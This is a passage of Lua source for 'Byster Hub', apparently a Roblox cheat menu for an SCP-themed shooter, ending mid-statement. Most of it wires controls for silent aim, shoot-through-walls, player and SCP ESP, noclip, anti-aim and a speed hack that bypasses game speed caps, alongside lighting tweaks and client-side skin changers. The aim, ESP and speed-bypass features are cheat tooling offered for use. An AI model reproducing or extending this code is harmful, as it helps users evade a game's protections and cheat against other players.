 local G=Tabs.Combat:AddLeftGroupbox("Friend List","users")
 G:AddInput("FriendInput",{Text="Add Player",Default="",Finished=true,Placeholder="Type a nickname...",AllowEmpty=true,Callback=function(v)
  v=trim(tostring(v or ""))
  if v=="" then return end
  local p=FL.Find(v)
  if not p or p==LocalPlayer then
   Library:Notify({Title="Friend List",Description="Player not found: "..v,Time=3})
  elseif FL.Add(p) then
   Library:Notify({Title="Friend List",Description=p.DisplayName.." added",Time=3})
  else
   Library:Notify({Title="Friend List",Description=p.DisplayName.." is already in the list",Time=3})
  end
  if Options.FriendInput then pcall(Options.FriendInput.SetValue,Options.FriendInput,"") end
 end})
 G:AddDivider()
 local FLabel=G:AddLabel("No friends added yet",true)
 local Rich=false
 pcall(function() FLabel.TextLabel.RichText=true Rich=true end)
 G:AddDropdown("FriendRemove",{Values={},Multi=false,Text="Remove Friend",AllowNull=true,Callback=function(v)
  if v and v~="" then
   FL.Remove(string.lower(v))
   if Options.FriendRemove then pcall(Options.FriendRemove.SetValue,Options.FriendRemove,nil) end
  end
 end})
 FL.Refresh=function()
  local Lines,Names={},{}
  local Hex=S.FriendColor:ToHex()
  for _,k in ipairs(FL.Order) do
   local I=FL.Map[k]
   if I then
    Names[#Names+1]=I.Name
    local Sh=I.Name
    if I.Display and I.Display~=I.Name then Sh=I.Display.." (@"..I.Name..")" end
    Lines[#Lines+1]=Rich and ('<font color="#'..Hex..'">●</font> '..escapeRich(Sh)) or ("● "..Sh)
   end
  end
  pcall(function() FLabel:SetText(#Lines>0 and table.concat(Lines,"\n") or "No friends added yet") end)
  if Options.FriendRemove then pcall(Options.FriendRemove.SetValues,Options.FriendRemove,Names) end
 end
 col(G:AddLabel("Friend Color"),"FriendColor","Friend Color",S,"FriendColor",function() FL.Refresh() end)
 tg(G,"IgnoreFriends","Ignore Friends (Silent Aim)",S,"IgnoreFriends")
 G:AddButton({Text="Clear Friend List",Risky=true,Func=FL.Clear})
 connect(Players.PlayerAdded,function(p)
  local I=FL.Map[string.lower(p.Name)]
  if I then I.Display=p.DisplayName FL.Refresh() end
 end)
end

local FOVGroup=Tabs.Combat:AddRightGroupbox("FOV and Marker","box")
col(tg(FOVGroup,"ShowFOV","Show FOV",S,"ShowFOV"),"FOVColor","FOV Color",S,"FOVColor")
tg(FOVGroup,"FOVCenter","Center FOV",S,"FOVCenter")
sl(FOVGroup,"FOVRadius","FOV Radius",S,"FOVRadius",10,500,0," px")
FOVGroup:AddDivider()
col(tg(FOVGroup,"ShowTarget","Target Marker",S,"ShowTarget"),"TargetColor","Marker Color",S,"TargetColor")
sl(FOVGroup,"MarkerSize","Marker Size",S,"MarkerSize",6,30,0,nil,function(v) S.MarkerLength=math.max(3,math.floor(v/2)) end)
sl(FOVGroup,"RotationSpeed","Marker Spin",S,"RotationSpeed",0,10,1)

local HitGroup=Tabs.Combat:AddRightGroupbox("Hit Log","crosshair")
tg(HitGroup,"HitLogOn","Hit Log",HIT,"On","Card with nickname, damage and remaining HP when you deal damage")
HitGroup:AddDropdown("HitLogPos",{Values={"Crosshair","Bottom","Top"},Default=HIT.Position,Multi=false,Text="Position",AllowNull=false,Callback=function(v) HIT.SetPosition(v or "Crosshair") end})
tg(HitGroup,"HitLogStrict","Strict (need my shot)",HIT,"Strict","Count damage only if you recently clicked on this victim")
sl(HitGroup,"HitLogRange","Hit Range",HIT,"Range",10,600,0," st")
HitGroup:AddSlider("HitLogWindow",{Text="Shot Window",Default=HIT.Window*1000,Min=200,Max=1500,Rounding=0,Suffix=" ms",Callback=function(v) HIT.Window=v/1000 end})
sl(HitGroup,"HitLogMax","Max Cards",HIT,"Max",1,5,0)
sl(HitGroup,"HitLogLife","Card Lifetime",HIT,"Life",1,8,1," s")
HitGroup:AddButton({Text="Test Hit",Func=function() HIT.Test() end})

local function teamNames()
 local L={"No Team"}
 for _,t in ipairs(Teams:GetTeams()) do L[#L+1]=t.Name end
 return L
end
local PlayerGroup=Tabs.Visuals:AddLeftGroupbox("Player ESP","scan-eye")
local PE=tg(PlayerGroup,"PlayerESP","Player ESP",S,"PlayerESP","Chams, box and skeleton for players",function() syncChams() end)
col(PE,"FallbackColor","No-Team Color",S,"FallbackColor")
kp(PE,"PlayerESPKeybind","P","Player ESP")
tg(PlayerGroup,"ESPChams","Chams",S,"ESPChams",nil,function() syncChams() end)
tg(PlayerGroup,"ESPBox","Box",S,"ESPBox")
tg(PlayerGroup,"ESPSkeleton","Skeleton",S,"ESPSkeleton")
tg(PlayerGroup,"TeamColors","Team Colors",S,"TeamColors")
PlayerGroup:AddDropdown("ESPTeams",{Values=teamNames(),Multi=true,Text="Teams (none selected = all)",Searchable=true,AllowNull=true,Callback=function(v) rebuildTeamSel(v) end})
local function refreshTeams()
 if Options.ESPTeams then pcall(Options.ESPTeams.SetValues,Options.ESPTeams,teamNames()) end
 rebuildTeamSel()
end
connect(Teams.ChildAdded,function() task.defer(refreshTeams) end)
connect(Teams.ChildRemoved,function() task.defer(refreshTeams) end)

local XGroup=Tabs.Visuals:AddRightGroupbox("ESP Settings","layers")
col(XGroup:AddLabel("Friend Color"),"ESPFriendColor","Friend Color",S,"FriendColor")
sl(XGroup,"FillTransparency","Chams Transparency",S,"FillTransparency",0,100,0,"%")
sl(XGroup,"MaxDistance","Max Distance",S,"MaxDistance",100,5000,0," st")
sl(XGroup,"ESPXThick","Line Thickness",ESPX,"Thick",1,5,1)
sl(XGroup,"ESPXRate","Refresh Rate",ESPX,"Rate",30,240,0," Hz")
sl(XGroup,"ESPXSkelDist","Skeleton Distance",ESPX,"SkelDist",50,1500,0," st")
XGroup:AddLabel("Lower Refresh Rate, Max Distance and Skeleton Distance = more FPS.",true)

local TravGroup=Tabs.Movement:AddLeftGroupbox("Traversal","navigation")
kp(tg(TravGroup,"Noclip","Noclip",S,"Noclip",nil,function(v) if not v then restoreNoclip() end end),"NoclipKeybind","N","Noclip")
local SpeedGroup=Tabs.Movement:AddLeftGroupbox("Walk Speed (Bypass)","zap")


local AAGroup=Tabs.Movement:AddRightGroupbox("Anti-Aim","gauge")
tg(AAGroup,"AntiAim","Anti-Aim (Spin)",S,"AntiAim")
sl(AAGroup,"AntiAimSpeed","Spin Speed",S,"AntiAimSpeed",5,100,0)

local function wToggle(G,K,T,Tip) tg(G,"W_"..K,T,W,K,Tip) end
local function wSlider(G,K,T,Min,Max,R,Suf) sl(G,"W_"..K,T,W,K,Min,Max,R,Suf) end
local function wColor(G,K,T) col(G:AddLabel(T),"W_"..K,T,W,K) end

local PresetGroup=Tabs.World:AddLeftGroupbox("World Presets","palette")
PresetGroup:AddDropdown("W_Preset",{Values=PresetNames,Default="Night",Multi=false,Text="Preset",AllowNull=false})
PresetGroup:AddButton({Text="Apply Preset",Func=function()
 local s=Options.W_Preset and Options.W_Preset.Value
 if s then applyPreset(s) end
end})
PresetGroup:AddButton({Text="Reset World",Risky=true,Func=function() resetWorld() setFullbright(false) end})

local TimeGroup=Tabs.World:AddLeftGroupbox("Time","clock")
wToggle(TimeGroup,"TimeOn","Override Time","Locks the clock to the value below")
wSlider(TimeGroup,"ClockTime","Clock Time",0,24,1," h")
wToggle(TimeGroup,"TimeLapse","Time Lapse","Clock runs by itself while Override Time is on")
wSlider(TimeGroup,"TimeLapseSpeed","Lapse Speed",0.1,5,1," h/s")
TimeGroup:AddDropdown("W_QuickTime",{Values={"Dawn","Noon","Sunset","Night","Midnight"},Multi=false,Text="Quick Time",AllowNull=true,Callback=function(v)
 if v and QuickTimes[v] then
  setWorld("TimeOn",true)
  setWorld("ClockTime",QuickTimes[v])
 end
end})

local LightGroup=Tabs.World:AddLeftGroupbox("Fullbright","lightbulb")
tg(LightGroup,"Fullbright","Fullbright",S,"Fullbright","Fully brightens the map. Turning it off restores the previous lighting")

local FogGroup=Tabs.World:AddLeftGroupbox("Fog","cloud-fog")
wToggle(FogGroup,"FogOn","Override Fog")
wColor(FogGroup,"FogColor","Fog Color")
wSlider(FogGroup,"FogStart","Fog Start",0,5000,0," st")
wSlider(FogGroup,"FogEnd","Fog End",10,100000,0," st")

local BlurGroup=Tabs.World:AddLeftGroupbox("Blur","droplets")
wToggle(BlurGroup,"BlurOn","Blur")
wSlider(BlurGroup,"BlurSize","Blur Size",0,56,0)

local CCGroup=Tabs.World:AddLeftGroupbox("Color Correction","sliders-horizontal")
wToggle(CCGroup,"CCOn","Color Correction")
wSlider(CCGroup,"CCBrightness","Brightness",-1,1,2)
wSlider(CCGroup,"CCContrast","Contrast",-1,1,2)
wSlider(CCGroup,"CCSaturation","Saturation",-1,1,2)
wColor(CCGroup,"CCTint","Tint Color")

local AtmoGroup=Tabs.World:AddRightGroupbox("Atmosphere","wind")
wToggle(AtmoGroup,"AtmoOn","Override Atmosphere","Edits the game's Atmosphere, or adds one if it has none")
wSlider(AtmoGroup,"AtmoDensity","Density",0,1,2)
wSlider(AtmoGroup,"AtmoOffset","Offset",0,1,2)
wColor(AtmoGroup,"AtmoColor","Color")
wColor(AtmoGroup,"AtmoDecay","Decay Color")
wSlider(AtmoGroup,"AtmoGlare","Glare",0,10,1)
wSlider(AtmoGroup,"AtmoHaze","Haze",0,10,1)

local SkyGroup=Tabs.World:AddRightGroupbox("Sky","moon")
wToggle(SkyGroup,"SkyOn","Override Sky")
wSlider(SkyGroup,"Stars","Star Count",0,5000,0)
wToggle(SkyGroup,"Bodies","Show Sun and Moon")
wSlider(SkyGroup,"SunSize","Sun Size",0,60,0)
wSlider(SkyGroup,"MoonSize","Moon Size",0,60,0)

local CloudGroup=Tabs.World:AddRightGroupbox("Clouds","cloud")
wToggle(CloudGroup,"CloudsOn","Override Clouds","Edits the terrain clouds, or adds them if missing")
wSlider(CloudGroup,"CloudCover","Cover",0,1,2)
wSlider(CloudGroup,"CloudDensity","Density",0,1,2)
wColor(CloudGroup,"CloudColor","Cloud Color")

local BloomGroup=Tabs.World:AddRightGroupbox("Bloom","sparkles")
wToggle(BloomGroup,"BloomOn","Bloom")
wSlider(BloomGroup,"BloomIntensity","Intensity",0,5,2)
wSlider(BloomGroup,"BloomSize","Size",0,56,0)
wSlider(BloomGroup,"BloomThreshold","Threshold",0,4,2)

local RaysGroup=Tabs.World:AddRightGroupbox("Sun Rays","sunrise")
wToggle(RaysGroup,"RaysOn","Sun Rays")
wSlider(RaysGroup,"RaysIntensity","Intensity",0,1,2)
wSlider(RaysGroup,"RaysSpread","Spread",0,1,2)

local DOFGroup=Tabs.World:AddRightGroupbox("Depth of Field","aperture")
wToggle(DOFGroup,"DOFOn","Depth of Field")
wSlider(DOFGroup,"DOFFocus","Focus Distance",0,500,0," st")
wSlider(DOFGroup,"DOFRadius","In-Focus Radius",0,500,0," st")
wSlider(DOFGroup,"DOFFar","Far Intensity",0,1,2)
wSlider(DOFGroup,"DOFNear","Near Intensity",0,1,2)

local CameraGroup=Tabs.World:AddRightGroupbox("Camera","camera")
wToggle(CameraGroup,"FOVOn","Override FOV")
wSlider(CameraGroup,"FOV","Field of View",30,120,0,"°")
wToggle(CameraGroup,"ZoomOn","Override Max Zoom")
wSlider(CameraGroup,"Zoom","Max Zoom",10,1000,0," st")

local PerfGroup=Tabs.World:AddRightGroupbox("FPS Boost","gauge")
PerfGroup:AddToggle("FPSBoost",{Text="FPS Boost (Medium)",Tooltip="Removes only heavy textures on large surfaces. Characters are untouched",Default=false,Callback=function(v) FPS.Set(v) end})
sl(PerfGroup,"FPSMinSize","Min Surface Size",FPS,"MinSize",4,60,0," st")
PerfGroup:AddButton({Text="Re-scan Map",Func=function() if FPS.On then FPS.Scan() end end})
PerfGroup:AddLabel("Lower value = removes more textures. Turning it off restores everything.",true)

local CosUiOk,CosUiErr=pcall(function()

-- =============================================================
-- UI fragment — merged advanced controls, cosmetics, config sharing
-- =============================================================
do
	-- Cosmetics engine init errors (notify once)
	if type(Cos.Errors)=="string" and Cos.Errors~="" then
		pcall(function() Library:Notify({Title="Byster Hub",Description="Cosmetics engine error: "..Cos.Errors,Time=8}) end)
	end

	-- =============================================================
	-- Silent Aim merged: advanced rows inside the basic
	-- "Silent Aim" groupbox (AimGroup comes from the base script)
	-- =============================================================
	AimGroup:AddDivider()
	AimGroup:AddLabel("Advanced Engine")
	AimGroup:AddToggle("SaAdv",{Text="Silent Aim (Advanced)",Tooltip="Silent aim on the game controller hook. Turns the basic Silent Aim off while active",Default=false,Callback=function(v)
		if not Cos.Adv or not Cos.Adv.SetSilentAim then
			pcall(function() Library:Notify({Title="Byster Hub",Description="Silent Aim (Advanced) not ready: "..tostring(Cos.Errors or "unknown"),Time=8}) end)
			return
		end
		local ok, err = pcall(Cos.Adv.SetSilentAim, Cos.Adv, v)
		if not ok then
			pcall(function() Library:Notify({Title="Byster Hub",Description="Silent Aim error: "..tostring(err),Time=10}) end)
		end
	end})
	AimGroup:AddDropdown("SaTargetPart",{Values={"Auto","Nearest Hitbox","Head","Torso","HumanoidRootPart"},Default="Auto",Multi=false,Text="Target Part (Advanced)",AllowNull=false,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		if Cos.Adv then pcall(Cos.Adv.SetTargetPart,Cos.Adv,n) end
	end})
	AimGroup:AddToggle("SaTargetSCPs",{Text="Target SCPs",Default=false,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetTargetSCPs,Cos.Adv,v) end end})
	AimGroup:AddToggle("SaWallCheck",{Text="Wall Check (Advanced)",Default=true,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetWallCheck,Cos.Adv,v) end end})
	AimGroup:AddToggle("SaThroughWalls",{Text="Shoot Through Walls (Advanced)",Default=true,Tooltip="Advanced engine ignores walls when picking the target point",Default=true,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetAllowWallbang,Cos.Adv,v) end end})
	AimGroup:AddSlider("SaFOV",{Text="FOV (Advanced)",Default=100,Min=30,Max=400,Rounding=1,Suffix="px",Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetFOV,Cos.Adv,v) end end})
	AimGroup:AddSlider("SaHitChance",{Text="Hit Chance",Default=100,Min=0,Max=100,Rounding=1,Suffix="%",Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetHitChance,Cos.Adv,v) end end})
	AimGroup:AddSlider("SaHeadChance",{Text="Auto Head Chance",Default=100,Min=0,Max=100,Rounding=1,Suffix="%",Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetHeadChance,Cos.Adv,v) end end})
	AimGroup:AddSlider("SaTorsoChance",{Text="Auto Torso Chance",Default=100,Min=0,Max=100,Rounding=1,Suffix="%",Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetTorsoChance,Cos.Adv,v) end end})
	AimGroup:AddSlider("SaRootChance",{Text="Auto Root Chance",Default=100,Min=0,Max=100,Rounding=1,Suffix="%",Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetRootChance,Cos.Adv,v) end end})
	AimGroup:AddDivider()
	AimGroup:AddToggle("SaAutoReload",{Text="Auto Reload",Default=false,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetAutoReload,Cos.Adv,v) end end})
	-- =============================================================
	-- Player ESP merged: advanced (Drawing) rows inside the basic
	-- "Player ESP" groupbox (PlayerGroup comes from the base script)
	-- =============================================================
	PlayerGroup:AddDivider()
	PlayerGroup:AddLabel("Drawing ESP")
	PlayerGroup:AddToggle("AdvESP",{Text="Advanced Player ESP",Tooltip="Extra Drawing-based box/name/health ESP. Works on top of the Chams above",Default=false,Callback=function(v)
		if Cos.Adv then pcall(Cos.Adv.SetESP,Cos.Adv,v) end
	end})
	PlayerGroup:AddToggle("AdvESPBoxes",{Text="Show Boxes",Default=true,Callback=function(v) if Cos.Adv and Cos.Adv.ESP then Cos.Adv.ESP.ShowBoxes=v end end})
	PlayerGroup:AddToggle("AdvESPNames",{Text="Show Names",Default=true,Callback=function(v) if Cos.Adv and Cos.Adv.ESP then Cos.Adv.ESP.ShowNames=v end end})
	PlayerGroup:AddToggle("AdvESPHealth",{Text="Show Health Bar",Default=true,Callback=function(v) if Cos.Adv and Cos.Adv.ESP then Cos.Adv.ESP.ShowHealthBar=v end end})
	PlayerGroup:AddToggle("AdvESPTeamColor",{Text="Team Colors",Default=true,Callback=function(v) if Cos.Adv and Cos.Adv.ESP then Cos.Adv.ESP.ShowTeamColor=v end end})
	PlayerGroup:AddToggle("AdvESPIgnoreTeam",{Text="Hide Allies",Default=false,Callback=function(v) if Cos.Adv and Cos.Adv.Cfg then Cos.Adv.Cfg.IgnoreTeam=v end end})
	PlayerGroup:AddSlider("AdvESPDist",{Text="Max Distance",Default=5000,Min=50,Max=10000,Rounding=0,Suffix=" st",Callback=function(v) if Cos.Adv and Cos.Adv.ESP then Cos.Adv.ESP.MaxDistance=v end end})
	col(PlayerGroup:AddLabel("Enemy Color"),"AdvESPEnemy","Enemy Color",Cos.Adv and Cos.Adv.ESP or {EnemyColor=Color3.fromRGB(255,70,70)},"EnemyColor")
	col(PlayerGroup:AddLabel("Ally Color"),"AdvESPAlly","Ally Color",Cos.Adv and Cos.Adv.ESP or {AllyColor=Color3.fromRGB(70,255,70)},"AllyColor")
	-- =============================================================
	-- SCP ESP
	-- =============================================================
	local ScpGroup=Tabs.Visuals:AddRightGroupbox("SCP ESP","skull")
	ScpGroup:AddToggle("AdvScpESP",{Text="SCP ESP",Default=false,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetSCPESP,Cos.Adv,v) end end})
	ScpGroup:AddToggle("AdvScpNames",{Text="Show SCP Names",Default=true,Callback=function(v) if Cos.Adv then pcall(Cos.Adv.SetSCPNames,Cos.Adv,v) end end})
	ScpGroup:AddDivider()
	ScpGroup:AddLabel("ESP Color"):AddColorPicker("AdvScpColor",{Title="SCP ESP Color",Default=Color3.fromRGB(0,120,255),Callback=function(v)
		if Cos.Adv then pcall(Cos.Adv.SetSCPColors,Cos.Adv,v,nil) end
	end})
	ScpGroup:AddLabel("Name Color"):AddColorPicker("AdvScpNameColor",{Title="SCP Name Color",Default=Color3.fromRGB(255,255,255),Callback=function(v)
		if Cos.Adv then pcall(Cos.Adv.SetSCPColors,Cos.Adv,nil,v) end
	end})
	-- =============================================================
	-- Anti-Slowdown
	-- =============================================================
	local AsGroup=Tabs.Movement:AddLeftGroupbox("Anti-Slowdown","footprints")
	AsGroup:AddToggle("AdvAntiSlowdown",{Text="Anti-Slowdown",Tooltip="Keeps run speed at 16 or more when slowed down",Default=false,Callback=function(v) if Cos.Adv and Cos.Adv.Cfg then Cos.Adv.Cfg.AntiSlowdown=v end end})
	-- =============================================================
	-- Walk Speed (speed hack) merged into the base "Walk Speed" groupbox
	-- =============================================================
	SpeedGroup:AddToggle("AdvSpeed",{Text="Speed Hack",Tooltip="Teleports your character forward every frame, bypasses game speed caps",Default=false,Callback=function(v) if Cos.Adv and Cos.Adv.Cfg then Cos.Adv.Cfg.SpeedhackEnabled=v end end})
	SpeedGroup:AddSlider("AdvSpeedMult",{Text="Speed Multiplier",Default=15,Min=10,Max=20,Rounding=1,Suffix="x0.1",Callback=function(v) if Cos.Adv and Cos.Adv.Cfg then Cos.Adv.Cfg.SpeedMultiplier=v end end})

	local SkinGroup=Tabs.Cosmetics:AddLeftGroupbox("Skin Changer","palette")
	SkinGroup:AddToggle("SkinEnabled",{Text="Enable Skin Changer",Tooltip="Applies custom textures to weapons, SCP-096 bag and SCP-173 cage",Default=false,Callback=function(v)
		weaponSkinEnabled=v or false
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end})
	SkinGroup:AddDropdown("SkinWeapon",{Values={"Obsidian","Gold","Diamond","Emerald","Ruby","Platinum","Dimension","Gem","Waves","Hazard","Cheese","SCP","Anniversary 2025","Halloween 2024","Winter 2024","Halloween 2023","Winter 2023","Gold Wrap","Reptile","Protector","Liberator","Plasma","Fire","Energy","Warp","Moon","Metal","Rust","Crystal","Ice","Hexagon","Snow","Tiger","Zebra","Glass","Paint","Ghost","Sky","Night","Flecktarn","Woodland","Splinter","Digital","Navy","Urban"},Default="Obsidian",Multi=false,Text="Gun Skin",AllowNull=false,Callback=function(v)
		weaponSkinName=type(v)=="table" and v[1] or v
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end})
	SkinGroup:AddDropdown("SkinMaterial",{Values={"Default","ForceField (Glow)","Neon","Glass","Foil (Chrome)","SmoothPlastic"},Default="Default",Multi=false,Text="Weapon Material",AllowNull=false,Callback=function(v)
		weaponSkinMaterial=type(v)=="table" and v[1] or v
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end})
	SkinGroup:AddToggle("SkinRainbow",{Text="Rainbow Chroma",Tooltip="Cycles weapon color continuously, overrides the tint",Default=false,Callback=function(v)
		weaponSkinRainbow=v or false
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end})
	SkinGroup:AddSlider("SkinRainbowSpeed",{Text="Rainbow Speed",Default=1,Min=1,Max=10,Rounding=1,Suffix="x",Callback=function(v)
		weaponSkinRainbowSpeed=v
	end})
	local function ObjSkinList(kind)
		local out={"Default"}
		pcall(function()
			local t=Cos.Objects and Cos.Objects[kind]
			if type(t)=="table" then
				local extra={}
				for k in pairs(t) do extra[#extra+1]=tostring(k) end
				table.sort(extra)
				for _,k in ipairs(extra) do out[#out+1]=k end
			end
		end)
		return out
	end
	local function ApplyBagCombo(n)
		n = tostring(n or "Default")
		local used=false
		if type(Cos.Objects)=="table" and Cos.Objects.Set then
			local ok,err=pcall(Cos.Objects.Set,Cos.Objects,"Bag",n)
			if ok then
				used=true
				bag096Skin="Default"
			else
				pcall(function() Library:Notify({Title="Byster Hub",Description="Bag skin error: "..tostring(err),Time=8}) end)
			end
		end
		if not used then
			local wb="Default"
			if type(bag096Textures)=="table" then
				if bag096Textures[n] then wb=n
				else
					local base=tostring(n):gsub("%s+Bag$","")
					if bag096Textures[base] then wb=base end
				end
			end
			bag096Skin=wb
			if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
		end
	end
	local function ApplyCageCombo(n)
		n = tostring(n or "Default")
		local used=false
		if type(Cos.Objects)=="table" and Cos.Objects.Set then
			local ok,err=pcall(Cos.Objects.Set,Cos.Objects,"Cage",n)
			if ok then
				used=true
				cage173Skin="Default"
			else
				pcall(function() Library:Notify({Title="Byster Hub",Description="Cage skin error: "..tostring(err),Time=8}) end)
			end
		end
		if not used then
			local wc="Default"
			if type(cage173Textures)=="table" then
				if cage173Textures[n] then wc=n
				else
					local base=tostring(n):gsub("%s+Cage$","")
					if cage173Textures[base] then wc=base end
				end
			end
			cage173Skin=wc
			if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
		end
	end
	SkinGroup:AddDropdown("SkinBag",{Values=ObjSkinList("Bag"),Default="Default",Multi=false,Text="SCP-096 Bag Skin",AllowNull=false,Callback=function(v)
		ApplyBagCombo(type(v)=="table" and v[1] or v)
	end})
	SkinGroup:AddDropdown("SkinCage",{Values=ObjSkinList("Cage"),Default="Default",Multi=false,Text="SCP-173 Cage Skin",AllowNull=false,Callback=function(v)
		ApplyCageCombo(type(v)=="table" and v[1] or v)
	end})
	SkinGroup:AddDivider()
	SkinGroup:AddToggle("SkinTintOn",{Text="Custom Weapon Tint",Default=false,Callback=function(v)
		weaponSkinUseTint=v or false
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end}):AddColorPicker("SkinTint",{Title="Weapon Tint Color",Default=Color3.fromRGB(255,255,255),Callback=function(v)
		weaponSkinTint=v
		if weaponSkinEnabled then pcall(applyWeaponSkinChanger,true) end
	end})

	local FxGroup=Tabs.Cosmetics:AddRightGroupbox("Kill & C4 Effects","skull")
	local FxKillList, FxC4List
	pcall(function() FxKillList = Cos.Fx and Cos.Fx.Names and Cos.Fx.Names("Kill") end)
	pcall(function() FxC4List = Cos.Fx and Cos.Fx.Names and Cos.Fx.Names("C4") end)
	if type(FxKillList) ~= "table" or #FxKillList == 0 then FxKillList = {"None"} end
	if type(FxC4List) ~= "table" or #FxC4List == 0 then FxC4List = {"None"} end
	local function CosFxSafe(desc, fn)
		local ok, err = pcall(fn)
		if not ok then
			Cos.Errors = (Cos.Errors or "") .. "[" .. desc .. "] " .. tostring(err) .. "; "
			pcall(function() Library:Notify({Title="Byster Hub",Description=desc.." error: "..tostring(err),Time=10}) end)
		end
	end
	Toggles.FxKill=FxGroup:AddDropdown("FxKill",{Values=FxKillList,Default="None",Multi=false,Text="Kill Effect",AllowNull=true,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		CosFxSafe("Kill Set", function()
			if Cos.Fx and Cos.Fx.SetKill then pcall(Cos.Fx.SetKill,n or "None") end
		end)
		if n and n~="None" then if Toggles.FxKillMaster then pcall(function() Toggles.FxKillMaster:SetValue(true) end) end end
	end})
	Toggles.FxKillMaster=FxGroup:AddToggle("FxKillMaster",{Text="Enable Kill Effects",Tooltip="Plays the selected effect on deaths",Default=false,Callback=function(v)
		CosFxSafe("Kill Master", function()
			if Cos.Fx and Cos.Fx.SetMaster then pcall(Cos.Fx.SetMaster,v) end
		end)
	end})
	FxGroup:AddToggle("FxSelf",{Text="Kill Effects on Self",Tooltip="Also plays kill effects on your own deaths",Default=false,Callback=function(v)
		CosFxSafe("Kill Self", function()
			if Cos.Fx and Cos.Fx.SetSelf then pcall(Cos.Fx.SetSelf,v) end
		end)
	end})
	FxGroup:AddToggle("FxOthers",{Text="Kill Effects on Others",Tooltip="Also plays kill effects on other players' deaths",Default=false,Callback=function(v)
		CosFxSafe("Kill Others", function()
			if Cos.Fx and Cos.Fx.SetOthers then pcall(Cos.Fx.SetOthers,v) end
		end)
	end})
	FxGroup:AddDropdown("FxC4",{Values=FxC4List,Default="None",Multi=false,Text="C4 Effect",AllowNull=true,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		CosFxSafe("C4 Set", function()
			if Cos.Fx and Cos.Fx.SetC4 then pcall(Cos.Fx.SetC4,n or "None") end
		end)
	end})
	FxGroup:AddToggle("FxC4OnDeath",{Text="C4 Effect on Own Death",Default=false,Callback=function(v)
		CosFxSafe("C4 Death", function()
			if Cos.Fx and Cos.Fx.SetC4OnDeath then pcall(Cos.Fx.SetC4OnDeath,v) end
		end)
	end})
	FxGroup:AddDivider()
	FxGroup:AddButton({Text="Test Kill Effect",Func=function()
		CosFxSafe("Kill Test", function()
			if Cos.Fx and Cos.Fx.TestKill then pcall(Cos.Fx.TestKill) end
		end)
	end})
	FxGroup:AddButton({Text="Test C4 Effect",Func=function()
		CosFxSafe("C4 Test", function()
			if Cos.Fx and Cos.Fx.TestC4 then pcall(Cos.Fx.TestC4) end
		end)
	end})

	local ObjGroup=Tabs.Cosmetics:AddLeftGroupbox("SCP Object Cosmetics","box")
	local function CosObjNames(kind)
		if Cos.Objects and Cos.Objects.Names and Cos.Objects[kind] then
			local ok, list = pcall(Cos.Objects.Names, Cos.Objects, Cos.Objects[kind])
			if ok and type(list)=="table" and #list>0 then return list end
		end
		return {"Default"}
	end
	local function CosObjSet(kword, value)
		if not Cos.Objects then
			pcall(function() Library:Notify({Title="Byster Hub",Description="Object Cosmetics not ready: "..tostring(Cos.Errors or "unknown"),Time=7}) end)
			return
		end
		local ok, err = pcall(Cos.Objects.Set, Cos.Objects, kword, value)
		if not ok then
			pcall(function() Library:Notify({Title="Byster Hub",Description="Object Set error: "..tostring(err),Time=10}) end)
		end
	end
	ObjGroup:AddDropdown("CosCage",{Values=CosObjNames("Cage"),Default="Default",Multi=false,Text="SCP-173 Cage (Extra)",AllowNull=false,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		CosObjSet("Cage", type(n)=="string" and n or "Default")
	end})
	ObjGroup:AddDropdown("CosCrate",{Values=CosObjNames("Crate"),Default="Default",Multi=false,Text="SCP Crate",AllowNull=false,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		CosObjSet("Crate", type(n)=="string" and n or "Default")
	end})
	ObjGroup:AddDropdown("CosBag",{Values=CosObjNames("Bag"),Default="Default",Multi=false,Text="SCP-096 Bag (Extra)",AllowNull=false,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		CosObjSet("Bag", type(n)=="string" and n or "Default")
	end})

	local AuraGroup=Tabs.Cosmetics:AddRightGroupbox("Particle Aura","sparkles")
	AuraGroup:AddToggle("AuraOn",{Text="Enable Particle Aura",Tooltip="Attaches a particle effect to your character",Default=false,Callback=function(v)
		if Cos.Aura and Cos.Aura.SetEnabled then pcall(Cos.Aura.SetEnabled,Cos.Aura,v) end
	end})
	AuraGroup:AddDropdown("AuraParticle",{Values={"starlight","heavenly","ribbon","sakura","angel","wind","flow","star"},Default="angel",Multi=false,Text="Particle",AllowNull=false,Callback=function(v)
		local n=type(v)=="table" and v[1] or v
		if n and Cos.Aura and Cos.Aura.Select then pcall(Cos.Aura.Select,Cos.Aura,n) end
	end})
	AuraGroup:AddLabel("Aura Color",true):AddColorPicker("AuraColor",{Title="Aura Color",Default=Color3.fromRGB(255,255,255),Callback=function(v)
		if Cos.Aura and Cos.Aura.Recolor then pcall(Cos.Aura.Recolor,Cos.Aura,v) end
	end})

	-- =============================================================
	-- Config Sharing — UI Settings tab
	-- Config JSON -> digits-only "code" that can be shared and pasted
	-- back to load the exact same config (works across PCs)
	-- =============================================================
	local function CosUiSafe(desc, fn)
		local ok, err = pcall(fn)
		if not ok then
			pcall(function() Library:Notify({Title="Byster Hub",Description=desc.." error: "..tostring(err),Time=10}) end)
		end
	end
	local ShareGroup
	pcall(function() ShareGroup=Tabs["UI Settings"]:AddLeftGroupbox("Code CFG","code") end)
	if not ShareGroup then pcall(function() ShareGroup=Tabs["UI Settings"]:AddLeftGroupbox("Code CFG") end) end
	if not ShareGroup then
